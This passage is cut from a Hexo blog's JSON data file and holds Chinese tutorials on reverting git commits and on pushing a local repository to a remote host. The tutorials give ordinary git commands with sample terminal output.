class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">commit c15ebaadf86bde882035a68e09f0b7832ea271f6</div><div class=\"line\">    删除无用文件</div><div class=\"line\"></div><div class=\"line\">commit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5</div><div class=\"line\">    修改静态资源版本</div><div class=\"line\"></div><div class=\"line\">commit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac</div><div class=\"line\">    pvrs接口切回测试环境</div><div class=\"line\"></div><div class=\"line\">commit a00d98c53e86182054eb4e77a18e3044f5f9d658</div><div class=\"line\">    搜索无数据返回，导致空指针异常处理</div></pre></td></tr></table></figure></p>\n<p>如果期望代码回滚到 <strong>277563b24904f3f70eb210f6fa1d3f3f1ee914ac</strong> 这个状态的话，则需要撤销后一个版本 <strong>763ab06edb1b5054fbd12e94317e2f13ac4b2af5</strong> 以后的所有代码提交。<br>执行命令：<code>git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5</code></p>\n<h3 id=\"2-回滚已经提交，但未发布代码\"><a href=\"#2-回滚已经提交，但未发布代码\" class=\"headerlink\" title=\"2. 回滚已经提交，但未发布代码\"></a>2. 回滚已经提交，但未发布代码</h3><p><strong>参考</strong>：<a href=\"https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C\">Git 基础 - 撤消操作</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">git commit -m &apos;initial commit&apos;</div><div class=\"line\">git add forgotten_file</div><div class=\"line\">git commit --amend</div></pre></td></tr></table></figure>"},{"title":"推送本地git仓库","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n本文参考：[Create Local Git Repo & Push to GitHub](https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github)\n\n\n## 一、打开终端\n\n## 二、到本地文件目录\n > cd /home/developer/public_html\n\n## 三、配置git\n用户名：\n`git config --global user.name \"叶绍亭\"`\n\n邮箱：\n`git config --global user.email \"yeshaoting@163.com\"`\n\n配色方案：\n`git config --global color.ui auto`\n\n## 四、 项目初始化\n`git init`\n\n初始化成功会看到如下内容：\n``` shell\n\"Initialized empty Git repository in home/developer/public_html/.git\"\n```\n\n<!-- more -->\n\n## 五、验证初始化后的状态\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\n\n## 六、添加文件或者目录到索引(index)\n`git add *`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Changes to be committed:\n#   (use \"git rm --cached <file>...\" to unstage)\n#\n#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库\n#   new file:   bootstrap/css/bootstrap-theme.min.css\n#   new file:   bootstrap/css/bootstrap.css\n#   new file:   bootstrap/css/bootstrap.min.css\n#   new file:   bootstrap/css/custom.css\n#   new file:   bootstrap/css/offcanvas.css\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff\n#   new file:   bootstrap/js/bootstrap.js\n#   new file:   bootstrap/js/bootstrap.min.js\n#   new file:   bootstrap/js/holder.js\n#   new file:   index.html\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n```\n\n## 七、提交索引内容到仓库(repository)\n`git commit -m \"My first commit\"`\n\n应该能看到类似如下的信息：\n``` shell\n[master (root-commit) c43daef] My first commit\n14 files changed, 9927 insertions(+)\ncreate mode 100644 bootstrap/css/bootstrap-theme.css\ncreate mode 100644 bootstrap/css/bootstrap-theme.min.css\ncreate mode 100644 bootstrap/css/bootstrap.css\ncreate mode 100644 bootstrap/css/bootstrap.min.css\ncreate mode 100644 bootstrap/css/custom.css\ncreate mode 100755 bootstrap/css/offcanvas.css\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff\ncreate mode 100644 bootstrap/js/bootstrap.js\ncreate mode 100644 bootstrap/js/bootstrap.min.js\ncreate mode 100755 bootstrap/js/holder.js\ncreate mode 100644 index.html\n```\n\n## 八、提交索引内容到仓库(repository)\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track) \n```\n\n## 九、创建git账户及远程代码仓库\n\n## 十、连接本地仓库与远程仓库\n`git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 20, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (20/20), done.\nWriting objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.\nTotal 20 (delta 2), reused 0 (delta 0)\nTo https://github.com/your_name/your_repo.git\n* [new branch]      master -> master\nBranch master set up to track remote branch master from origin.\n```\n\n## 十一、推送本地仓库到远程仓库\n`git push -u origin master`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 10, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (6/6), done.\nWriting objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.\nTotal 9 (delta 0), reused 0 (delta 0)\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n   8a82c26..90efea5  master -> master\n分支 master 设置为跟踪来自 origin 的远程分支 master。\n```\n\n### 补充说明\n如若出现如下错误：\n``` shell\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n ! [rejected]        master -> master (fetch first)\nerror: 无法推送一些引用到 'git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git'\n提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外\n提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更\n提示：（如 'git pull ...'）。\n提示：详见 'git push --help' 中的 'Note about fast-forwards' 小节。\n```\n\n说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。\n此时，执行如下命令即可：\n`git pull origin master`\n\n``` shell\n来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity\n * branch            master     -> FETCH_HEAD\nMerge made by the 'recursive' strategy.\n LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n README.md |   1 +\n 2 files changed, 192 insertions(+)\n create mode 100644 LICENSE\n create mode 100644 README.md\n```\n\n","source":"_posts/article/git/推送本地git仓库.md","raw":"categories:\n  - 版本控制\ntags:\n  - git\ntitle: 推送本地git仓库\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n本文参考：[Create Local Git Repo & Push to GitHub](https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github)\n\n\n## 一、打开终端\n\n## 二、到本地文件目录\n > cd /home/developer/public_html\n\n## 三、配置git\n用户名：\n`git config --global user.name \"叶绍亭\"`\n\n邮箱：\n`git config --global user.email \"yeshaoting@163.com\"`\n\n配色方案：\n`git config --global color.ui auto`\n\n## 四、 项目初始化\n`git init`\n\n初始化成功会看到如下内容：\n``` shell\n\"Initialized empty Git repository in home/developer/public_html/.git\"\n```\n\n<!-- more -->\n\n## 五、验证初始化后的状态\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\n\n## 六、添加文件或者目录到索引(index)\n`git add *`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Changes to be committed:\n#   (use \"git rm --cached <file>...\" to unstage)\n#\n#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库\n#   new file:   bootstrap/css/bootstrap-theme.min.css\n#   new file:   bootstrap/css/bootstrap.css\n#   new file:   bootstrap/css/bootstrap.min.css\n#   new file:   bootstrap/css/custom.css\n#   new file:   bootstrap/css/offcanvas.css\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf\n#   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff\n#   new file:   bootstrap/js/bootstrap.js\n#   new file:   bootstrap/js/bootstrap.min.js\n#   new file:   bootstrap/js/holder.js\n#   new file:   index.html\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n```\n\n## 七、提交索引内容到仓库(repository)\n`git commit -m \"My first commit\"`\n\n应该能看到类似如下的信息：\n``` shell\n[master (root-commit) c43daef] My first commit\n14 files changed, 9927 insertions(+)\ncreate mode 100644 bootstrap/css/bootstrap-theme.css\ncreate mode 100644 bootstrap/css/bootstrap-theme.min.css\ncreate mode 100644 bootstrap/css/bootstrap.css\ncreate mode 100644 bootstrap/css/bootstrap.min.css\ncreate mode 100644 bootstrap/css/custom.css\ncreate mode 100755 bootstrap/css/offcanvas.css\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf\ncreate mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff\ncreate mode 100644 bootstrap/js/bootstrap.js\ncreate mode 100644 bootstrap/js/bootstrap.min.js\ncreate mode 100755 bootstrap/js/holder.js\ncreate mode 100644 index.html\n```\n\n## 八、提交索引内容到仓库(repository)\n`git status`\n\n应该能看到类似如下的信息：\n``` shell\n# On branch master\n#\n# Initial commit\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   .project\n#   bootstrap/\n#   index.html\nnothing added to commit but untracked files present (use \"git add\" to track) \n```\n\n## 九、创建git账户及远程代码仓库\n\n## 十、连接本地仓库与远程仓库\n`git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 20, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (20/20), done.\nWriting objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.\nTotal 20 (delta 2), reused 0 (delta 0)\nTo https://github.com/your_name/your_repo.git\n* [new branch]      master -> master\nBranch master set up to track remote branch master from origin.\n```\n\n## 十一、推送本地仓库到远程仓库\n`git push -u origin master`\n\n应该能看到类似如下的信息：\n``` shell\nCounting objects: 10, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (6/6), done.\nWriting objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.\nTotal 9 (delta 0), reused 0 (delta 0)\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n   8a82c26..90efea5  master -> master\n分支 master 设置为跟踪来自 origin 的远程分支 master。\n```\n\n### 补充说明\n如若出现如下错误：\n``` shell\nTo git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git\n ! [rejected]        master -> master (fetch first)\nerror: 无法推送一些引用到 'git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git'\n提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外\n提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更\n提示：（如 'git pull ...'）。\n提示：详见 'git push --help' 中的 'Note about fast-forwards' 小节。\n```\n\n说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。\n此时，执行如下命令即可：\n`git pull origin master`\n\n``` shell\n来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity\n * branch            master     -> FETCH_HEAD\nMerge made by the 'recursive' strategy.\n LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n README.md |   1 +\n 2 files changed, 192 insertions(+)\n create mode 100644 LICENSE\n create mode 100644 README.md\n```\n\n","slug":"article/git/推送本地git仓库","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqd00185nbth6cbcqx7","content":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\"></p>\n<p>本文参考：<a href=\"https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github\" target=\"_blank\" rel=\"external\">Create Local Git Repo &amp; Push to GitHub</a></p>\n<h2 id=\"一、打开终端\"><a href=\"#一、打开终端\" class=\"headerlink\" title=\"一、打开终端\"></a>一、打开终端</h2><h2 id=\"二、到本地文件目录\"><a href=\"#二、到本地文件目录\" class=\"headerlink\" title=\"二、到本地文件目录\"></a>二、到本地文件目录</h2><blockquote>\n<p>cd /home/developer/public_html</p>\n</blockquote>\n<h2 id=\"三、配置git\"><a href=\"#三、配置git\" class=\"headerlink\" title=\"三、配置git\"></a>三、配置git</h2><p>用户名：<br><code>git config --global user.name &quot;叶绍亭&quot;</code></p>\n<p>邮箱：<br><code>git config --global user.email &quot;yeshaoting@163.com&quot;</code></p>\n<p>配色方案：<br><code>git config --global color.ui auto</code></p>\n<h2 id=\"四、-项目初始化\"><a href=\"#四、-项目初始化\" class=\"headerlink\" title=\"四、 项目初始化\"></a>四、 项目初始化</h2><p><code>git init</code></p>\n<p>初始化成功会看到如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;Initialized empty Git repository in home/developer/public_html/.git&quot;</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h2 id=\"五、验证初始化后的状态\"><a href=\"#五、验证初始化后的状态\" class=\"headerlink\" title=\"五、验证初始化后的状态\"></a>五、验证初始化后的状态</h2><p><code>git status</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"># On branch master</div><div class=\"line\">#</div><div class=\"line\"># Initial commit</div><div class=\"line\">#</div><div class=\"line\"># Untracked files:</div><div class=\"line\">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</div><div class=\"line\">#</div><div class=\"line\">#   .project</div><div class=\"line\">#   bootstrap/</div><div class=\"line\">#   index.html</div><div class=\"line\">nothing added to commit but untracked files present (use &quot;git add&quot; to track)</div></pre></td></tr></table></figure></p>\n<h2 id=\"六、添加文件或者目录到索引-index\"><a href=\"#六、添加文件或者目录到索引-index\" class=\"headerlink\" title=\"六、添加文件或者目录到索引(index)\"></a>六、添加文件或者目录到索引(index)</h2><p><code>git add *</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"># On branch master</div><div class=\"line\">#</div><div class=\"line\"># Initial commit</div><div class=\"line\">#</div><div class=\"line\"># Changes to be committed:</div><div class=\"line\">#   (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage)</div><div class=\"line\">#</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap-theme.min.css</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap.css</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap.min.css</div><div class=\"line\">#   new file:   bootstrap/css/custom.css</div><div class=\"line\">#   new file:   bootstrap/css/offcanvas.css</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.eot</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.svg</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.ttf</div><div class=\"line\">#   new file:   bootstrap/fonts/glyphicons-halflings-regular.woff</div><div class=\"line\">#   new file:   bootstrap/js/bootstrap.js</div><div class=\"line\">#   new file:   bootstrap/js/bootstrap.min.js</div><div class=\"line\">#   new file:   bootstrap/js/holder.js</div><div class=\"line\">#   new file:   index.html</div><div class=\"line\">#</div><div class=\"line\"># Untracked files:</div><div class=\"line\">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</div><div class=\"line\">#</div><div class=\"line\">#   .project</div></pre></td></tr></table></figure></p>\n<h2 id=\"七、提交索引内容到仓库-repository\"><a href=\"#七、提交索引内容到仓库-repository\" class=\"headerlink\" title=\"七、提交索引内容到仓库(repository)\"></a>七、提交索引内容到仓库(repository)</h2><p><code>git commit -m &quot;My first commit&quot;</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">[master (root-commit) c43daef] My first commit</div><div class=\"line\">14 files changed, 9927 insertions(+)</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap-theme.css</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap-theme.min.css</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap.css</div><div class=\"line\">create mode 100644 bootstrap/css/bootstrap.min.css</div><div class=\"line\">create mode 100644 bootstrap/css/custom.css</div><div class=\"line\">create mode 100755 bootstrap/css/offcanvas.css</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.eot</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.svg</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.ttf</div><div class=\"line\">create mode 100644 bootstrap/fonts/glyphicons-halflings-regular.woff</div><div class=\"line\">create mode 100644 bootstrap/js/bootstrap.js</div><div class=\"line\">create mode 100644 bootstrap/js/bootstrap.min.js</div><div class=\"line\">create mode 100755 bootstrap/js/holder.js</div><div class=\"line\">create mode 100644 index.html</div></pre></td></tr></table></figure></p>\n<h2 id=\"八、提交索引内容到仓库-repository\"><a href=\"#八、提交索引内容到仓库-repository\" class=\"headerlink\" title=\"八、提交索引内容到仓库(repository)\"></a>八、提交索引内容到仓库(repository)</h2><p><code>git status</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"># On branch master</div><div class=\"line\">#</div><div class=\"line\"># Initial commit</div><div class=\"line\">#</div><div class=\"line\"># Untracked files:</div><div class=\"line\">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</div><div class=\"line\">#</div><div class=\"line\">#   .project</div><div class=\"line\">#   bootstrap/</div><div class=\"line\">#   index.html</div><div class=\"line\">nothing added to commit but untracked files present (use &quot;git add&quot; to track)</div></pre></td></tr></table></figure></p>\n<h2 id=\"九、创建git账户及远程代码仓库\"><a href=\"#九、创建git账户及远程代码仓库\" class=\"headerlink\" title=\"九、创建git账户及远程代码仓库\"></a>九、创建git账户及远程代码仓库</h2><h2 id=\"十、连接本地仓库与远程仓库\"><a href=\"#十、连接本地仓库与远程仓库\" class=\"headerlink\" title=\"十、连接本地仓库与远程仓库\"></a>十、连接本地仓库与远程仓库</h2><p><code>git remote add origin git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">Counting objects: 20, done.</div><div class=\"line\">Delta compression using up to 8 threads.</div><div class=\"line\">Compressing objects: 100% (20/20), done.</div><div class=\"line\">Writing objects: 100% (20/20), 121.70 KiB | 0 bytes/s, done.</div><div class=\"line\">Total 20 (delta 2), reused 0 (delta 0)</div><div class=\"line\">To https://github.com/your_name/your_repo.git</div><div class=\"line\">* [new branch]      master -&gt; master</div><div class=\"line\">Branch master set up to track remote branch master from origin.</div></pre></td></tr></table></figure></p>\n<h2 id=\"十一、推送本地仓库到远程仓库\"><a href=\"#十一、推送本地仓库到远程仓库\" class=\"headerlink\" title=\"十一、推送本地仓库到远程仓库\"></a>十一、推送本地仓库到远程仓库</h2><p><code>git push -u origin master</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">Counting objects: 10, done.</div><div class=\"line\">Delta compression using up to 4 threads.</div><div class=\"line\">Compressing objects: 100% (6/6), done.</div><div class=\"line\">Writing objects: 100% (9/9), 1.33 KiB | 0 bytes/s, done.</div><div class=\"line\">Total 9 (delta 0), reused 0 (delta 0)</div><div class=\"line\">To git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</div><div class=\"line\">   8a82c26..90efea5  master -&gt; master</div><div class=\"line\">分支 master 设置为跟踪来自 origin 的远程分支 master。</div></pre></td></tr></table></figure></p>\n<h3 id=\"补充说明\"><a href=\"#补充说明\" class=\"headerlink\" title=\"补充说明\"></a>补充说明</h3><p>如若出现如下错误：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">To git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git</div><div class=\"line\"> ! [rejected]        master -&gt; master (fetch first)</div><div class=\"line\">error: 无法推送一些引用到 &apos;git@git.oschina.net:yeshaoting/martinye-demo-spring-velocity.git&apos;</div><div class=\"line\">提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外</div><div class=\"line\">提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更</div><div class=\"line\">提示：（如 &apos;git pull ...&apos;）。</div><div class=\"line\">提示：详见 &apos;git push --help&apos; 中的 &apos;Note about fast-forwards&apos; 小节。</div></pre></td></tr></table></figure></p>\n<p>说明，远程代码仓库已经存在部分代码，且未 pull 最新代码到本地仓库，出现冲突。<br>此时，执行如下命令即可：<br><code>git pull origin master</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">来自 git.oschina.net:yeshaoting/martinye-demo-spring-velocity</div><div class=\"line\"> * branch            master     -&gt; FETCH_HEAD</div><div class=\"line\">Merge made by the &apos;recursive&apos; strategy.</div><div class=\"line\"> LICENSE   | 191 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</div><div class=\"line\"> README.md |   1 +</div><div class=\"line\"> 2 files changed, 192 insertions(+)</div><div class=\"line\"> create mode 100644 LICENSE</div><div class=\"line\"> create mode 100644 README.md</div></pre></td></tr></table></figure>\n","excerpt":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" /></p>\n<p>本文参考：<a href=\"https://www.texniq.de/en/web-engineering-i/create-local-git-repo-and-push-to-github\">Create Local Git Repo &amp; Push to GitHub</a></p>\n<h2 id=\"一、打开终端\"><a href=\"#一、打开终端\" class=\"headerlink\" title=\"一、打开终端\"></a>一、打开终端</h2><h2 id=\"二、到本地文件目录\"><a href=\"#二、到本地文件目录\" class=\"headerlink\" title=\"二、到本地文件目录\"></a>二、到本地文件目录</h2><blockquote>\n<p>cd /home/developer/public_html</p>\n</blockquote>\n<h2 id=\"三、配置git\"><a href=\"#三、配置git\" class=\"headerlink\" title=\"三、配置git\"></a>三、配置git</h2><p>用户名：<br><code>git config --global user.name &quot;叶绍亭&quot;</code></p>\n<p>邮箱：<br><code>git config --global user.email &quot;yeshaoting@163.com&quot;</code></p>\n<p>配色方案：<br><code>git config --global color.ui auto</code></p>\n<h2 id=\"四、-项目初始化\"><a href=\"#四、-项目初始化\" class=\"headerlink\" title=\"四、 项目初始化\"></a>四、 项目初始化</h2><p><code>git init</code></p>\n<p>初始化成功会看到如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;Initialized empty Git repository in home/developer/public_html/.git&quot;</div></pre></td></tr></table></figure></p>","more":"<h2 id=\"五、验证初始化后的状态\"><a href=\"#五、验证初始化后的状态\" class=\"headerlink\" title=\"五、验证初始化后的状态\"></a>五、验证初始化后的状态</h2><p><code>git status</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"># On branch master</div><div class=\"line\">#</div><div class=\"line\"># Initial commit</div><div class=\"line\">#</div><div class=\"line\"># Untracked files:</div><div class=\"line\">#   (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</div><div class=\"line\">#</div><div class=\"line\">#   .project</div><div class=\"line\">#   bootstrap/</div><div class=\"line\">#   index.html</div><div class=\"line\">nothing added to commit but untracked files present (use &quot;git add&quot; to track)</div></pre></td></tr></table></figure></p>\n<h2 id=\"六、添加文件或者目录到索引-index\"><a href=\"#六、添加文件或者目录到索引-index\" class=\"headerlink\" title=\"六、添加文件或者目录到索引(index)\"></a>六、添加文件或者目录到索引(index)</h2><p><code>git add *</code></p>\n<p>应该能看到类似如下的信息：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"># On branch master</div><div class=\"line\">#</div><div class=\"line\"># Initial commit</div><div class=\"line\">#</div><div class=\"line\"># Changes to be committed:</div><div class=\"line\">#   (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage)</div><div class=\"line\">#</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap-theme.css推送本地git仓库</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap-theme.min.css</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap.css</div><div class=\"line\">#   new file:   bootstrap/css/bootstrap.min.css</div><div class=\"line\">#   new file:   bootstrap/css/custom.css</div><div class=\"line\">#   new file:   